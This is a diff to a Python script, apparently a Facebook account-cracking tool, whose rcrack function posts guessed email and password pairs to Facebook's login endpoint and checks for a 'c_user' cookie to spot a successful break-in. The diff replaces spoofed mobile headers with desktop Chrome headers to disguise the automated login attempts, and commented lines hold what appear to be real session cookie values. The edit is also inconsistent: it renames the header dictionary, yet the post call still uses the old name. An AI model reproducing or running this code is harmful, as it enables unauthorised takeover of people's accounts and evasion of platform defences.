@@ -415,31 +415,26 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {
-    'authority': 'x.facebook.com',
-    'accept': '*/*',
-    'accept-language': 'en-US,en;q=0.9',
+            headers = {
+    'authority': 'www.alpha.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'fa-AF,fa;q=0.9,en-US;q=0.8,en;q=0.7',
+    'cache-control': 'max-age=0',
     'content-type': 'application/x-www-form-urlencoded',
-    # 'cookie': 'datr=jRboZKkkWlD4hAfDY0fpErny; sb=jRboZDLFI-71m370snCg-JpV; locale=en_US; m_pixel_ratio=2.625; dpr=2.625; wd=412x724; fr=0iKjeQKOXB1qWFEmv.AWVUB1d5tlLXB6RSIggO53KMy1o.Bk6BdY.72.AAA.0.0.Bk6B41.AWVXunkP3x4',
-    'dpr': '2.625',
-    'origin': 'https://x.facebook.com',
-    'referer': 'https://x.facebook.com/',
-    'sec-ch-prefers-color-scheme': 'light',
+    # 'cookie': 'datr=mS3uZA7nU3TLSI8pRoXE79kW; sb=mS3uZJs4T4dSrpwtR2bk_zgE; fr=0C8xQ1T6dBJlE9i85..Bk7i2Z.Y2.AAA.0.0.Bk7rH-.AWWAV2RJagw; wd=980x920; dpr=4',
+    'origin': 'https://www.alpha.facebook.com',
+    'referer': 'https://www.alpha.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348131',
     'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="114", "Google Chrome";v="114"',
-    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="114.0.5836.202", "Google Chrome";v="114.0.5836.202"',
     'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-model': '"SM-G975U"',
     'sec-ch-ua-platform': '"macOS"',
-    'sec-ch-ua-platform-version': '""',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'same-origin',
-    'user-agent': pro,
-    'viewport-width': '412',
-    'x-asbd-id': '129477',
-    'x-fb-lsd': 'AVrqBrF5Idc',
-    'x-requested-with': 'XMLHttpRequest',
-    'x-response-format': 'JSONStream',}
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5785.211 Safari/537.36',
+}
+
             lo = session.post('https://x.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
